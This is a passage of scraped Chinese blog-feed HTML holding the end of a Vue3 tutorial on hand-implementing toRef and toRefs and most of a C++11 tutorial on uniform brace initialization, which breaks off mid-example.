<span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> }); 

<span class="hljs-comment">// 尝试解构 </span>
<span class="hljs-keyword">const</span> { name, age } = state; 
<span class="hljs-comment">// 此时，name 和 age 只是普通的字符串和数字，不再是响应式的 </span>
<span class="hljs-comment">// 修改它们不会触发 UI 更新 </span>

name = <span class="hljs-string">'李四'</span>; 
<span class="hljs-comment">// 这行代码在严格模式下会报错，因为解构出来的是常量 </span>
<span class="hljs-comment">// 即使不报错，UI 也不会更新</span>
</code></pre>
<p><code>toRef</code> 函数正是为了解决这个问题而设计的。</p>
<h3 data-id="heading-8">基本用法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ 
  <span class="hljs-attr">fistName</span>: <span class="hljs-string">'lee'</span>,
  <span class="hljs-attr">lastName</span>: <span class="hljs-string">'mary'</span>
});

<span class="hljs-comment">// 第一种用法：对象属性转换</span>
<span class="hljs-keyword">const</span> fistName = <span class="hljs-title function_">toRef</span>(state, <span class="hljs-string">'fistName'</span>);
<span class="hljs-keyword">const</span> lastName = <span class="hljs-title function_">toRef</span>(state, <span class="hljs-string">'lastName'</span>);

<span class="hljs-comment">// 第二种用法：计算属性转换</span>
<span class="hljs-keyword">const</span> fullName = <span class="hljs-title function_">toRef</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">${firstName.value}</span> <span class="hljs-subst">${lastName.value}</span>`</span>);

<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> (state.<span class="hljs-property">firstName</span> = <span class="hljs-string">"tom"</span>), <span class="hljs-number">1000</span>);
<span class="hljs-comment">// 一秒钟后：</span>
<span class="hljs-comment">// toRef 的 firstName 和 lastName 会同步更新</span>
<span class="hljs-comment">// fullName 也会自动更新</span>
</code></pre>
<h3 data-id="heading-9">具体实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 将值、对象属性或 getter 函数转换为 ref
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">source</span> - 源值、对象或函数
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">key</span> - 属性键（可选）
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">defaultValue</span> - 默认值（可选）
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">RefImpl|GetterRefImpl|ObjectRefImpl</span>} 对应的 ref 实例
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">toRef</span>(<span class="hljs-params">source, key, defaultValue</span>) {
  <span class="hljs-comment">// 如果源已经是 ref，直接返回</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRef</span>(source)) {
    <span class="hljs-keyword">return</span> source;
  }
  <span class="hljs-comment">// 如果源是函数，创建 getter ref</span>
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isFunction</span>(source)) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GetterRefImpl</span>(source);
  }
  <span class="hljs-comment">// 如果源是对象且提供了键，创建对象属性 ref</span>
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isObject</span>(source) &amp;&amp; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">propertyToRef</span>(source, key, defaultValue);
  }
  <span class="hljs-comment">// 否则创建普通 ref</span>
  <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">ref</span>(source);
  }
}
</code></pre>
<p>上述代码根据数据源 <code>source</code> 的不同类型进行相应处理：</p>
<ul>
<li>如果已经是 <code>Ref</code>，直接返回</li>
<li>如果是函数，交给 <code>GetterRefImpl</code> 类处理</li>
<li>如果是对象且有第二个参数，交给 <code>propertyToRef</code> 函数处理</li>
<li>其他情况，生成普通的 <code>RefImpl</code> 实例</li>
</ul>
<h4 data-id="heading-10">GetterRefImpl 类的实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * getter 引用实现类
 * 用于将 getter 函数转换为响应式 ref
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GetterRefImpl</span> {
  [<span class="hljs-title class_">ReactiveFlags</span>.<span class="hljs-property">IS_REF</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标识为 ref 对象</span>
  _value = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// 缓存值</span>
  _getter; <span class="hljs-comment">// getter 函数</span>

  <span class="hljs-comment">/**
   * 构造函数
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} <span class="hljs-variable">getter</span> - getter 函数
   */</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">getter</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_getter</span> = getter;
  }

  <span class="hljs-comment">/**
   * 执行 getter 并返回结果
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any</span>} getter 执行结果
   */</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_getter</span>());
  }
}
</code></pre>
<h4 data-id="heading-11">对象属性的处理</h4>
<p>当 <code>source</code> 是对象时，会交给 <code>propertyToRef</code> 函数处理：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 将对象属性转换为 ref 的内部函数
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">object</span>} <span class="hljs-variable">source</span> - 源对象
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string|number</span>} <span class="hljs-variable">key</span> - 属性键
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">defaultValue</span> - 默认值
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">ObjectRefImpl</span>} 对象属性 ref
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">propertyToRef</span>(<span class="hljs-params">source, key, defaultValue</span>) {
  <span class="hljs-keyword">const</span> val = source[key];
  <span class="hljs-comment">// 如果属性值已经是 ref，直接返回；否则创建对象属性 ref</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isRef</span>(val) ? val : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectRefImpl</span>(source, key, defaultValue);
}
</code></pre>
<p>如果 <code>source</code> 中属性的值已经是 <code>Ref</code>，则直接返回；否则继续交给 <code>ObjectRefImpl</code> 处理：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 对象属性引用实现类
 * 用于将对象的某个属性转换为 ref
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectRefImpl</span> {
  [<span class="hljs-title class_">ReactiveFlags</span>.<span class="hljs-property">IS_REF</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标识为 ref 对象</span>
  _object; <span class="hljs-comment">// 源对象</span>
  _key; <span class="hljs-comment">// 属性键</span>
  _defaultValue; <span class="hljs-comment">// 默认值</span>

  <span class="hljs-comment">/**
   * 构造函数
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">object</span>} <span class="hljs-variable">object</span> - 源对象
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string|number</span>} <span class="hljs-variable">key</span> - 属性键
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">defaultValue</span> - 默认值
   */</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">object, key, defaultValue</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_object</span> = object;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_key</span> = key;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_defaultValue</span> = defaultValue;
  }

  <span class="hljs-comment">/**
   * 获取属性值
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any</span>} 属性值或默认值
   */</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-keyword">const</span> val = <span class="hljs-variable language_">this</span>.<span class="hljs-property">_object</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_key</span>];
    <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = val === <span class="hljs-literal">undefined</span> ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">_defaultValue</span> : val);
  }

  <span class="hljs-comment">/**
   * 设置属性值
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} <span class="hljs-variable">newValue</span> - 新值
   */</span>
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newValue</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_object</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_key</span>] = newValue;
  }
}
</code></pre>
<h2 data-id="heading-12">手动实现toRefs函数</h2>
<p><code>toRefs</code> 将一个响应式对象转换为一个普通对象，这个普通对象的每个属性都是指向源对象相应属性的 ref。每个单独的 ref 都是使用 <code>toRef()</code> 创建的。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 将响应式对象的所有属性转换为 refs
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">object|Array</span>} <span class="hljs-variable">object</span> - 响应式对象
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">object</span>} 包含所有属性 refs 的对象
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">toRefs</span>(<span class="hljs-params">object</span>) {
  <span class="hljs-comment">// 根据源对象类型初始化返回对象</span>
  <span class="hljs-keyword">const</span> ret = <span class="hljs-title function_">isArray</span>(object) ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(object.<span class="hljs-property">length</span>) : {};
  <span class="hljs-comment">// 遍历对象的所有可枚举属性（包括继承的属性）</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> object) {
    ret[key] = <span class="hljs-title function_">propertyToRef</span>(object, key);
  }
  <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<h2 data-id="heading-13">总结</h2>
<p>通过手动实现 <code>ref</code>、<code>toRef</code> 和 <code>toRefs</code>，我们深入理解了 Vue3 响应式系统中引用类型的工作原理。这些实现展示了 Vue3 如何通过巧妙的类设计和依赖收集机制，为开发者提供简洁而强大的响应式 API。</p>
<p>理解这些底层原理不仅有助于我们更好地使用 Vue3，也能在遇到复杂场景时提供解决问题的思路。希望这篇文章能帮助你更深入地掌握 Vue3 的响应式系统！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[c++11 之 统一初始化（Uniform Initalization）]]></title>    <link>https://juejin.cn/post/7574726841543032870</link>    <guid>https://juejin.cn/post/7574726841543032870</guid>    <pubDate>2025-11-21T03:24:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574726841543032870" data-draft-id="7571751304625684526" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="c++11 之 统一初始化（Uniform Initalization）"/> <meta itemprop="keywords" content="程序员,C++"/> <meta itemprop="datePublished" content="2025-11-21T03:24:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GuSir"/> <meta itemprop="url" content="https://juejin.cn/user/3261574409623161"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            c++11 之 统一初始化（Uniform Initalization）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261574409623161/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GuSir
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:24:55.000Z" title="Fri Nov 21 2025 03:24:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一. 变量初始化</h2>
<p><code>int a = 1;</code>、<code>int b(2);</code> 两种写法，无统一标准</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 主函数：程序执行的起点（必须有且仅有一个）</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 基本类型：统一用 {}，支持省略等号</span>
    <span class="hljs-type">int</span> a{<span class="hljs-number">1</span>};       <span class="hljs-comment">// 等价于 int a = 1;</span>
    <span class="hljs-type">double</span> b{<span class="hljs-number">3.14</span>}; <span class="hljs-comment">// 无隐式类型转换（如写 b{3} 没问题，但 b{3.14f} 也没问题，严格来说是窄化转换被禁止）</span>

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Hello GCC! 这是C++主程序"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 控制台输出内容</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 程序正常退出（返回0表示成功）</span>
}
</code></pre>
<h2 data-id="heading-1">二. 数组初始化</h2>
<p>int arr[] = {1,2,3};` 对于聚合对象有区别</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// main.cpp：C++ 主程序入口</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span>  <span class="hljs-comment">// 包含输入输出流库（cout 所需）</span></span>

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">teacher</span> {
    <span class="hljs-type">int</span> id;         <span class="hljs-comment">// 成员1：编号</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* name; <span class="hljs-comment">// 成员2：姓名</span>
    <span class="hljs-type">int</span> age;        <span class="hljs-comment">// 成员3：年龄</span>
};

<span class="hljs-comment">// 主函数：程序执行的起点（必须有且仅有一个）</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 验证1：单个对象的聚合初始化（C++11+支持，C++03不支持）</span>
    teacher t1 = {<span class="hljs-number">101</span>, <span class="hljs-string">"Zhang San"</span>, <span class="hljs-number">35</span>}; <span class="hljs-comment">// 等号可选</span>
    teacher t2{<span class="hljs-number">102</span>, <span class="hljs-string">"Li Si"</span>, <span class="hljs-number">40</span>};        <span class="hljs-comment">// C++11+ 允许省略等号（列表初始化）</span>

    <span class="hljs-comment">// 验证2：数组的聚合初始化（直接用成员值，而非已创建对象）（C++11+支持，C++03不支持）</span>
    teacher arr[] = {
        {<span class="hljs-number">103</span>, <span class="hljs-string">"Wang Wu"</span>, <span class="hljs-number">38</span>},  <span class="hljs-comment">// 直接初始化数组第1个元素</span>
        {<span class="hljs-number">104</span>, <span class="hljs-string">"Zhao Liu"</span>, <span class="hljs-number">42</span>}  <span class="hljs-comment">// 直接初始化数组第2个元素</span>
    };


    std::cout &lt;&lt; <span class="hljs-string">"Hello GCC! 这是C++主程序"</span> &lt;&lt; std::endl;  <span class="hljs-comment">// 控制台输出内容</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 程序正常退出（返回0表示成功）</span>
}
</code></pre>
<ul>
<li>
<p><code>g++ main.cpp -o test -std=c++03</code> 方式编译会报错</p>
</li>
<li>
<p><code>g++ main.cpp -o test -std=c++11</code> 方式编译不会报错</p>
</li>
</ul>
<h2 data-id="heading-2">三. 容器初始化</h2>
<p><code>vector&lt;int&gt; v; v.push_back(1); v.push_back(2);</code> 繁琐，不能直接批量赋值；</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// C++98 代码</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    vector&lt;<span class="hljs-type">int</span>&gt; v; <span class="hljs-comment">// 空容器</span>
    v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 第1个元素</span>
    v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">2</span>); <span class="hljs-comment">// 第2个元素</span>
    v.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 第3个元素</span>
    <span class="hljs-comment">// 若要初始化10个元素，需写10行push_back，极其冗余</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>C++98 甚至不支持 <code>vector&lt;int&gt; v = {1,2,3};</code> 这种直观写法，唯一的「批量初始化」 workaround 是用数组临时中转，但更繁琐：</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// C++98 勉强实现批量初始化（不推荐）</span>
<span class="hljs-type">int</span> temp[] = {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>};
<span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">v</span><span class="hljs-params">(temp, temp + <span class="hljs-keyword">sizeof</span>(temp)/<span class="hljs-keyword">sizeof</span>(temp[<span class="hljs-number">0</span>]))</span></span>; <span class="hljs-comment">// 借助迭代器范围</span>
</code></pre>
<p>在c++11标准下，支持以下方式:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// C++11 代码</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;list&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 1. vector 直接批量初始化（像数组一样简洁）</span>
    vector&lt;<span class="hljs-type">int</span>&gt; v{<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>}; <span class="hljs-comment">// 等价于 v = {1,2,3,4,5}，支持等号可选</span>
    vector&lt;string&gt; strs{<span class="hljs-string">"apple"</span>, <span class="hljs-string">"banana"</span>, <span class="hljs-string">"orange"</span>}; <span class="hljs-comment">// 字符串容器也支持</span>

    <span class="hljs-comment">// 2. 其他容器同样支持</span>
    list&lt;<span class="hljs-type">int</span>&gt; lst{<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>}; <span class="hljs-comment">// 链表</span>
    map&lt;string, <span class="hljs-type">int</span>&gt; score{
        {<span class="hljs-string">"Zhang"</span>, <span class="hljs-number">90</span>},
        {<span class="hljs-string">"Li"</span>, <span class="hljs-number">85</span>},
        {<span class="hljs-string">"Wang"</span>, <span class="hljs-number">95</span>} <span class="hljs-comment">// map 的键值对批量初始化，直观清晰</span>
    };

    <span class="hljs-comment">// 3. 嵌套容器初始化（复杂场景也支持）</span>
    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; matrix{
        {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>},
        {<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>},
        {<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>} <span class="hljs-comment">// 二维vector直接初始化，无需多层push_back</span>
    };

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>代码可读性直接拉满，一眼就能看出容器的初始内容，彻底告别冗余的 <code>push_back</code>。</p>
<p>C++11 容器的 <code>{}</code> 初始化会直接根据 <code>initializer_list</code> 中的元素个数，<strong>一次性分配足够的内存</strong>，避免了多次扩容和元素拷贝：</p>
<ul>
<li>比如 <code>vector&lt;int&gt; v{1,2,3,4,5}</code>，容器会先计算出需要存储 5 个元素，直接分配能容纳 5 个 <code>int</code> 的内存，再把元素拷贝进去（仅一次拷贝）；</li>
<li>而 C++98 的 <code>push_back</code> 可能需要 2-3 次扩容（比如初始容量 1→2→4→8，最后容量 8，浪费空间且有多次拷贝）。</li>
</ul>
<h2 data-id="heading-3">四. 窄化转换风险</h2>
<p><code>double x = 3.14; int y = x;</code>（double→int 丢失精度，C++98 仅警告，不报错）；</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 测试1：C++98 允许的窄化转换（C++11 {} 禁止）</span>
    <span class="hljs-type">int</span> a{<span class="hljs-number">3.14</span>}; <span class="hljs-comment">// 窄化转换：编译错误（C++11）</span>

    <span class="hljs-comment">// 测试2：显式转换后允许（C++11）</span>
    <span class="hljs-type">int</span> b = static_cast&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">3.14</span>); <span class="hljs-comment">// 显式声明，编译通过</span>

    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"b = "</span> &lt;&lt; b &lt;&lt; <span class="hljs-built_in">endl</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<ul>
<li><code>g++ main.cpp -o test -std=c++03</code> 编译只有警告，但是能编译通过</li>
<li><code>g++ main.cpp -o test -std=c++11</code> 编译报错</li>
</ul>
<h2 data-id="heading-4">五. 初始化歧义</h2>
<p><code>vector&lt;int&gt; v(10);</code>（10 个默认值 0）和 <code>vector&lt;int&gt; v{10};</code>（1 个元素 10），C++98 无区分方式</p>
<p><strong>仅支持圆括号 <code>()</code> 初始化</strong>：<code>vector&lt;int&gt; v(10)</code> 的行为和 C++11 一致（创建 10 个默认值为 <code>0</code> 的元素）</p>
<p><strong>不支持花括号 <code>{}</code> 初始化</strong>：
<code>vector&lt;int&gt; v{10}</code> 在 C++98 中是 <strong>语法错误</strong>，编译器无法识别花括号作为初始化列表的语法。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">v1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span>;
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"v1 使用 (10) 初始化："</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"  大小: "</span> &lt;&lt; v1.size() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; v2{<span class="hljs-number">10</span>};
